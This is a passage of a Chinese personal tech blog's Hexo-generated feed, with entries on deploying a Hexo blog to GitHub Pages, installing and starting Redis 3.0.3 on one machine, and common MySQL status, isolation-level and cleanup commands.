git@github.com:yeshaoting/yeshaoting.github.io.git</span><br><span class="line">  branch: master</span><br></pre></td></tr></table></figure><h3 id="发布到github"><a href="#发布到github" class="headerlink" title="发布到github"></a>发布到github</h3><p>hexo deploy</p><p>一般，之前需要生成静态文件hexo generate，<br>而在生成静态文件前，可以先清理之前的静态文件hexo clean。</p><h2 id="五、本地预览"><a href="#五、本地预览" class="headerlink" title="五、本地预览"></a>五、本地预览</h2><h2 id="安装-hexo-server"><a href="#安装-hexo-server" class="headerlink" title="安装 hexo-server"></a>安装 hexo-server</h2><p><code>npm install hexo-server --save</code></p><h2 id="启动服务"><a href="#启动服务" class="headerlink" title="启动服务"></a>启动服务</h2><h3 id="默认端口为4000"><a href="#默认端口为4000" class="headerlink" title="默认端口为4000"></a>默认端口为4000</h3><p>hexo server</p><h3 id="指定端口为5000"><a href="#指定端口为5000" class="headerlink" title="指定端口为5000"></a>指定端口为5000</h3><p>hexo server -p 5000</p><h3 id="指定地址"><a href="#指定地址" class="headerlink" title="指定地址"></a>指定地址</h3><p>hexo server -i 192.168.1.1</p><h2 id="五、常用操作"><a href="#五、常用操作" class="headerlink" title="五、常用操作"></a>五、常用操作</h2><h3 id="创建文章"><a href="#创建文章" class="headerlink" title="创建文章"></a>创建文章</h3><p>hexo new [layout] &lt;title&gt;<br>新建的文章默认会被保存在source/_posts文件夹。<br>其中，layout默认为post，若指定，会在scaffolds文件夹找对应的布局文件。</p><h3 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">hexo new &quot;postName&quot; #新建文章</span><br><span class="line">hexo new page &quot;pageName&quot; #新建页面</span><br><span class="line">hexo generate #生成静态页面至public目录</span><br><span class="line">hexo server #开启预览访问端口（默认端口4000，&#x27;ctrl + c&#x27;关闭server）</span><br><span class="line">hexo deploy #将.deploy目录部署到GitHub</span><br></pre></td></tr></table></figure><h3 id="常用复合命令"><a href="#常用复合命令" class="headerlink" title="常用复合命令"></a>常用复合命令</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hexo d -g #生成加部署</span><br><span class="line">hexo s -g #预览加部署</span><br></pre></td></tr></table></figure><h3 id="简写"><a href="#简写" class="headerlink" title="简写"></a>简写</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">hexo n == hexo new</span><br><span class="line">hexo g == hexo generate</span><br><span class="line">hexo s == hexo server</span><br><span class="line">hexo d == hexo deploy</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;img src=&quot;/asserts/images/logo/blog.png&quot; title=&quot;hexo&quot; class=&quot;img-logo img-center&quot; /&gt;


&lt;h2 id=&quot;一、创建Github-Pages&quot;&gt;&lt;a href=&quot;#一、创建Github-Pages&quot; class=&quot;headerlink&quot; title=&quot;一、创建Github Pages&quot;&gt;&lt;/a&gt;一、创建Github Pages&lt;/h2&gt;&lt;p&gt;Github Pages为我们提供静态页面的托管。&lt;br&gt;参见：&lt;a href=&quot;http://www.pchou.info/web-build/2013/01/05/build-github-blog-page-02.html&quot;&gt;一步步在GitHub上创建博客主页(2)&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&quot;1-注册github账号&quot;&gt;&lt;a href=&quot;#1-注册github账号&quot; class=&quot;headerlink&quot; title=&quot;1. 注册github账号&quot;&gt;&lt;/a&gt;1. 注册github账号&lt;/h3&gt;&lt;p&gt;登录github.com，创建用户账号：yeshaoting。&lt;br&gt;访问地址：&lt;a href=&quot;https://github.com/yeshaoting&quot;&gt;https://github.com/yeshaoting&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&quot;2-配置和使用github&quot;&gt;&lt;a href=&quot;#2-配置和使用github&quot; class=&quot;headerlink&quot; title=&quot;2. 配置和使用github&quot;&gt;&lt;/a&gt;2. 配置和使用github&lt;/h3&gt;&lt;p&gt;参见：&lt;a href=&quot;http://cnfeat.com/blog/2014/05/10/how-to-build-a-blog/&quot;&gt;如何搭建一个独立博客——简明 Github Pages与 jekyll 教程&lt;/a&gt;&lt;/p&gt;
&lt;h4 id=&quot;生成新的SSH-Key&quot;&gt;&lt;a href=&quot;#生成新的SSH-Key&quot; class=&quot;headerlink&quot; title=&quot;生成新的SSH Key&quot;&gt;&lt;/a&gt;生成新的SSH Key&lt;/h4&gt;&lt;figure class=&quot;highlight shell&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;ssh-keygen -t rsa -C &amp;quot;yeshaoting@163.com&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;在~/.ssh目录会生成秘钥id_rsa，公钥id_rsa.pub&lt;/p&gt;
&lt;h4 id=&quot;添加SSH-key到github&quot;&gt;&lt;a href=&quot;#添加SSH-key到github&quot; class=&quot;headerlink&quot; title=&quot;添加SSH key到github&quot;&gt;&lt;/a&gt;添加SSH key到github&lt;/h4&gt;&lt;ol&gt;
&lt;li&gt;查看并复制公钥id_rsa.pub内容。&lt;/li&gt;
&lt;li&gt;登录github，在Accout Settings -&amp;gt; SSH Public Keys -&amp;gt; add another public keys&lt;/li&gt;
&lt;li&gt;将复制id_rsa.pub内容复制到密钥文本框中。&lt;/li&gt;
&lt;/ol&gt;
&lt;h4 id=&quot;测试&quot;&gt;&lt;a href=&quot;#测试&quot; class=&quot;headerlink&quot; title=&quot;测试&quot;&gt;&lt;/a&gt;测试&lt;/h4&gt;&lt;figure class=&quot;highlight shell&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;ssh -T git@github.com&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;</summary>
    
    
    
    <category term="博客搭建" scheme="http://yeshaoting.cn/categories/%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/"/>
    
    
    <category term="hexo" scheme="http://yeshaoting.cn/tags/hexo/"/>
    
  </entry>
  
  <entry>
    <title>redis单机多实例部署</title>
    <link href="http://yeshaoting.cn/article/cache/redis%E5%8D%95%E6%9C%BA%E5%A4%9A%E5%AE%9E%E4%BE%8B%E9%83%A8%E7%BD%B2/"/>
    <id>http://yeshaoting.cn/article/cache/redis%E5%8D%95%E6%9C%BA%E5%A4%9A%E5%AE%9E%E4%BE%8B%E9%83%A8%E7%BD%B2/</id>
    <published>2015-12-29T05:58:00.000Z</published>
    <updated>2021-07-01T04:25:31.000Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h2 id="一、redis安装"><a href="#一、redis安装" class="headerlink" title="一、redis安装"></a>一、redis安装</h2><h2 id="Redis介绍"><a href="#Redis介绍" class="headerlink" title="Redis介绍"></a>Redis介绍</h2><p>Redis是一种高级key-value数据库。它跟memcached类似，不过数据可以持久化，而且支持的数据类型很丰富。有字符串，链表、哈希、集合和有序集合5种。支持在服务器端计算集合的并、交和补集(difference)等，还支持多种排序功能。所以Redis也可以被看成是一个数据结构服务器。Redis的所有数据都是保存在内存中，然后不定期的通过异步方式保存到磁盘上(这称为“半持久化模式”)；也可以把每一次数据变化都写入到一个append only file(aof)里面(这称为“全持久化模式”)。</p><h3 id="1-下载redis"><a href="#1-下载redis" class="headerlink" title="1. 下载redis"></a>1. 下载redis</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cd /opt/work/local</span><br><span class="line"></span><br><span class="line">wget -c http://download.redis.io/releases/redis-3.0.3.tar.gz</span><br><span class="line">tar -zxvf redis-3.0.3.tar.gz</span><br></pre></td></tr></table></figure><p>解压后的文件目录如下：<br><img src="http://images.cnitblog.com/i/420264/201404/191557148074939.jpg" alt="解压后的Redis目录结构"></p><h3 id="2-编译redis"><a href="#2-编译redis" class="headerlink" title="2. 编译redis"></a>2. 编译redis</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd /opt/work/local/redis-3.0.3</span><br><span class="line">make</span><br></pre></td></tr></table></figure><h3 id="3-拷贝产生的可执行命令"><a href="#3-拷贝产生的可执行命令" class="headerlink" title="3. 拷贝产生的可执行命令"></a>3. 拷贝产生的可执行命令</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mkdir -p /opt/work/local/redis/bin</span><br><span class="line">cd /opt/work/local/redis-3.0.3/src</span><br><span class="line">cp -p redis-benchmark redis-check-aof redis-check-dump redis-cli redis-sentinel redis-server mkreleasehdr.sh /opt/work/local/redis/bin</span><br></pre></td></tr></table></figure><h3 id="4-redis服务启动"><a href="#4-redis服务启动" class="headerlink" title="4. redis服务启动"></a>4. redis服务启动</h3><p>(1) 修改环境变量(vim  ~/.bash_profile)如下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">REDIS_HOME=/opt/work/local/redis</span><br><span class="line"></span><br><span class="line">PATH=$PATH:$HOME/bin:$REDIS_HOME/bin</span><br></pre></td></tr></table></figure><p>(2) 修改完成后，记得使用<code>source ~/.bash_profile</code>生效。</p><p>(3) 查看redis-server使用文档</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">[@zw_25_105 local]# redis-server --help</span><br><span class="line">Usage: ./redis-server [/path/to/redis.conf] [options]</span><br><span class="line">       ./redis-server - (read config from stdin)</span><br><span class="line">       ./redis-server -v or --version</span><br><span class="line">       ./redis-server -h or --help</span><br><span class="line">       ./redis-server --test-memory &lt;megabytes&gt;</span><br><span class="line"></span><br><span class="line">Examples:</span><br><span class="line">       ./redis-server (run the server with default conf)</span><br><span class="line">       ./redis-server /etc/redis/6379.conf</span><br><span class="line">       ./redis-server --port 7777</span><br><span class="line">       ./redis-server --port 7777 --slaveof 127.0.0.1 8888</span><br><span class="line">       ./redis-server /etc/myredis.conf --loglevel verbose</span><br><span class="line"></span><br><span class="line">Sentinel mode:</span><br><span class="line">       ./redis-server /etc/sentinel.conf --sentinel</span><br></pre></td></tr></table></figure><p>(4) 启动单机redis<br>使用默认的参数启动redis：<code>redis-server</code><br>指定端口启动redis：<code>redis-server --port 6380</code></p><p>(5) 允许redis端口远程连接<br>修改防火墙配置文件，如下所示：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/sysconfig/iptables</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 添加一行</span></span><br><span class="line">-A INPUT -m state --state NEW -m tcp -p tcp --dport 6380 -j ACCEPT</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 重新加载规则</span></span><br><span class="line">service iptables restart</span><br></pre></td></tr></table></figure><p>至此你就可以用客户端redis-cli连接了：<code>redis-cli -h 127.0.0.1 -p 6380</code></p><span id="more"></span><h2 id="二、redis主从配置"><a href="#二、redis主从配置" class="headerlink" title="二、redis主从配置"></a>二、redis主从配置</h2><h2 id="三、redis-sentinel配置"><a href="#三、redis-sentinel配置" class="headerlink" title="三、redis sentinel配置"></a>三、redis sentinel配置</h2><h2 id="四、参考文档："><a href="#四、参考文档：" class="headerlink" title="四、参考文档："></a>四、参考文档：</h2><p><a href="!http://www.cnblogs.com/liuling/p/2014-4-19-02.html">Redis安装及主从配置</a><br><a href="!http://www.cnblogs.com/eric-z/p/4153101.html">centos 安装redis（一台机器可以安装多个redis）</a><br><a href="!http://my.oschina.net/liuke1556/blog/287594">在一台机器上搭建多个redis实例</a></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;[TOC]&lt;/p&gt;
&lt;h2 id=&quot;一、redis安装&quot;&gt;&lt;a href=&quot;#一、redis安装&quot; class=&quot;headerlink&quot; title=&quot;一、redis安装&quot;&gt;&lt;/a&gt;一、redis安装&lt;/h2&gt;&lt;h2 id=&quot;Redis介绍&quot;&gt;&lt;a href=&quot;#Redis介绍&quot; class=&quot;headerlink&quot; title=&quot;Redis介绍&quot;&gt;&lt;/a&gt;Redis介绍&lt;/h2&gt;&lt;p&gt;Redis是一种高级key-value数据库。它跟memcached类似，不过数据可以持久化，而且支持的数据类型很丰富。有字符串，链表、哈希、集合和有序集合5种。支持在服务器端计算集合的并、交和补集(difference)等，还支持多种排序功能。所以Redis也可以被看成是一个数据结构服务器。Redis的所有数据都是保存在内存中，然后不定期的通过异步方式保存到磁盘上(这称为“半持久化模式”)；也可以把每一次数据变化都写入到一个append only file(aof)里面(这称为“全持久化模式”)。&lt;/p&gt;
&lt;h3 id=&quot;1-下载redis&quot;&gt;&lt;a href=&quot;#1-下载redis&quot; class=&quot;headerlink&quot; title=&quot;1. 下载redis&quot;&gt;&lt;/a&gt;1. 下载redis&lt;/h3&gt;&lt;figure class=&quot;highlight shell&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;cd /opt/work/local&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;wget -c http://download.redis.io/releases/redis-3.0.3.tar.gz&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;tar -zxvf redis-3.0.3.tar.gz&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;解压后的文件目录如下：&lt;br&gt;&lt;img src=&quot;http://images.cnitblog.com/i/420264/201404/191557148074939.jpg&quot; alt=&quot;解压后的Redis目录结构&quot;&gt;&lt;/p&gt;
&lt;h3 id=&quot;2-编译redis&quot;&gt;&lt;a href=&quot;#2-编译redis&quot; class=&quot;headerlink&quot; title=&quot;2. 编译redis&quot;&gt;&lt;/a&gt;2. 编译redis&lt;/h3&gt;&lt;figure class=&quot;highlight shell&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;cd /opt/work/local/redis-3.0.3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;make&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h3 id=&quot;3-拷贝产生的可执行命令&quot;&gt;&lt;a href=&quot;#3-拷贝产生的可执行命令&quot; class=&quot;headerlink&quot; title=&quot;3. 拷贝产生的可执行命令&quot;&gt;&lt;/a&gt;3. 拷贝产生的可执行命令&lt;/h3&gt;&lt;figure class=&quot;highlight shell&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;mkdir -p /opt/work/local/redis/bin&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;cd /opt/work/local/redis-3.0.3/src&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;cp -p redis-benchmark redis-check-aof redis-check-dump redis-cli redis-sentinel redis-server mkreleasehdr.sh /opt/work/local/redis/bin&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h3 id=&quot;4-redis服务启动&quot;&gt;&lt;a href=&quot;#4-redis服务启动&quot; class=&quot;headerlink&quot; title=&quot;4. redis服务启动&quot;&gt;&lt;/a&gt;4. redis服务启动&lt;/h3&gt;&lt;p&gt;(1) 修改环境变量(vim  ~/.bash_profile)如下：&lt;/p&gt;
&lt;figure class=&quot;highlight shell&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;REDIS_HOME=/opt/work/local/redis&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;PATH=$PATH:$HOME/bin:$REDIS_HOME/bin&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;(2) 修改完成后，记得使用&lt;code&gt;source ~/.bash_profile&lt;/code&gt;生效。&lt;/p&gt;
&lt;p&gt;(3) 查看redis-server使用文档&lt;/p&gt;
&lt;figure class=&quot;highlight shell&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;[@zw_25_105 local]# redis-server --help&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;Usage: ./redis-server [/path/to/redis.conf] [options]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;       ./redis-server - (read config from stdin)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;       ./redis-server -v or --version&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;       ./redis-server -h or --help&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;       ./redis-server --test-memory &amp;lt;megabytes&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;Examples:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;       ./redis-server (run the server with default conf)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;       ./redis-server /etc/redis/6379.conf&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;       ./redis-server --port 7777&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;       ./redis-server --port 7777 --slaveof 127.0.0.1 8888&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;       ./redis-server /etc/myredis.conf --loglevel verbose&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;Sentinel mode:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;       ./redis-server /etc/sentinel.conf --sentinel&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;(4) 启动单机redis&lt;br&gt;使用默认的参数启动redis：&lt;code&gt;redis-server&lt;/code&gt;&lt;br&gt;指定端口启动redis：&lt;code&gt;redis-server --port 6380&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;(5) 允许redis端口远程连接&lt;br&gt;修改防火墙配置文件，如下所示：&lt;/p&gt;
&lt;figure class=&quot;highlight shell&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;vim /etc/sysconfig/iptables&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;bash&quot;&gt; 添加一行&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;-A INPUT -m state --state NEW -m tcp -p tcp --dport 6380 -j ACCEPT&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;bash&quot;&gt; 重新加载规则&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;service iptables restart&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;至此你就可以用客户端redis-cli连接了：&lt;code&gt;redis-cli -h 127.0.0.1 -p 6380&lt;/code&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="数据存储" scheme="http://yeshaoting.cn/categories/%E6%95%B0%E6%8D%AE%E5%AD%98%E5%82%A8/"/>
    
    
    <category term="redis" scheme="http://yeshaoting.cn/tags/redis/"/>
    
    <category term="cache" scheme="http://yeshaoting.cn/tags/cache/"/>
    
  </entry>
  
  <entry>
    <title>mysql数据库命令小记</title>
    <link href="http://yeshaoting.cn/article/database/mysql%E6%95%B0%E6%8D%AE%E5%BA%93%E5%91%BD%E4%BB%A4%E5%B0%8F%E8%AE%B0/"/>
    <id>http://yeshaoting.cn/article/database/mysql%E6%95%B0%E6%8D%AE%E5%BA%93%E5%91%BD%E4%BB%A4%E5%B0%8F%E8%AE%B0/</id>
    <published>2015-12-29T05:58:00.000Z</published>
    <updated>2021-07-01T04:25:31.000Z</updated>
    
    <content type="html"><![CDATA[<img src="/asserts/images/logo/mysql.png" class="img-logo img-center" /><h2 id="查看innodb引擎状态"><a href="#查看innodb引擎状态" class="headerlink" title="查看innodb引擎状态"></a>查看innodb引擎状态</h2><p>可用于查看死锁情况：<br>show engine innodb status;</p><h2 id="查看锁情况"><a href="#查看锁情况" class="headerlink" title="查看锁情况"></a>查看锁情况</h2><p>表锁：show global status like ‘table_locks%’;<br>行锁：show global status like ‘innodb_row_lock%’;</p><h2 id="文件打开数"><a href="#文件打开数" class="headerlink" title="文件打开数"></a>文件打开数</h2><p>show global status like ‘open_files’;</p><h2 id="查看慢查询"><a href="#查看慢查询" class="headerlink" title="查看慢查询"></a>查看慢查询</h2><p>show full processlist;<br>SELECT * FROM information_schema.INNODB_TRX;<br>select @@autocommit;</p><h2 id="设置对应的编码"><a href="#设置对应的编码" class="headerlink" title="设置对应的编码"></a>设置对应的编码</h2><p>set character_set_server=utf8;</p><h2 id="查看数据库编码"><a href="#查看数据库编码" class="headerlink" title="查看数据库编码"></a>查看数据库编码</h2><p>SHOW VARIABLES LIKE ‘character%’;</p><span id="more"></span><h2 id="查看日期毫秒数"><a href="#查看日期毫秒数" class="headerlink" title="查看日期毫秒数"></a>查看日期毫秒数</h2><p>select unix_timestamp(‘2009-10-26 10:06:07’);</p><h2 id="查看日期"><a href="#查看日期" class="headerlink" title="查看日期"></a>查看日期</h2><p>select from_unixtime(1430211829676/1000);</p><h2 id="查看表索引"><a href="#查看表索引" class="headerlink" title="查看表索引"></a>查看表索引</h2><p>show index from table;</p><h2 id="查看数据库表字段"><a href="#查看数据库表字段" class="headerlink" title="查看数据库表字段"></a>查看数据库表字段</h2><p>select COLUMN_NAME from information_schema.COLUMNS<br>where table_name = ‘channel_movie’<br>and table_schema = ‘movie_ticket’;</p><h2 id="数据库事务隔离级别"><a href="#数据库事务隔离级别" class="headerlink" title="数据库事务隔离级别"></a>数据库事务隔离级别</h2><h3 id="查看当前会话隔离级别"><a href="#查看当前会话隔离级别" class="headerlink" title="查看当前会话隔离级别"></a>查看当前会话隔离级别</h3><p>select @@tx_isolation;</p><h3 id="查看系统当前隔离级别"><a href="#查看系统当前隔离级别" class="headerlink" title="查看系统当前隔离级别"></a>查看系统当前隔离级别</h3><p>select @@global.tx_isolation;</p><h3 id="设置当前会话隔离级别"><a href="#设置当前会话隔离级别" class="headerlink" title="设置当前会话隔离级别"></a>设置当前会话隔离级别</h3><p>set session transaction isolatin level repeatable read;</p><h3 id="设置系统当前隔离级别"><a href="#设置系统当前隔离级别" class="headerlink" title="设置系统当前隔离级别"></a>设置系统当前隔离级别</h3><p>set global transaction isolation level repeatable read;</p><h2 id="显示数据表索引"><a href="#显示数据表索引" class="headerlink" title="显示数据表索引"></a>显示数据表索引</h2><p>show index from user_login_status;</p><h2 id="删除重复数据（性能不佳）"><a href="#删除重复数据（性能不佳）" class="headerlink" title="删除重复数据（性能不佳）"></a>删除重复数据（性能不佳）</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">set</span> sql_safe_updates<span class="operator">=</span><span class="number">0</span>;</span><br><span class="line"><span class="keyword">delete</span> <span class="keyword">from</span> netnews.item</span><br><span class="line"><span class="keyword">where</span> id <span class="keyword">not</span> <span class="keyword">in</span> (</span><br><span class="line">     <span class="keyword">select</span> id <span class="keyword">from</span> (</span><br><span class="line">          <span 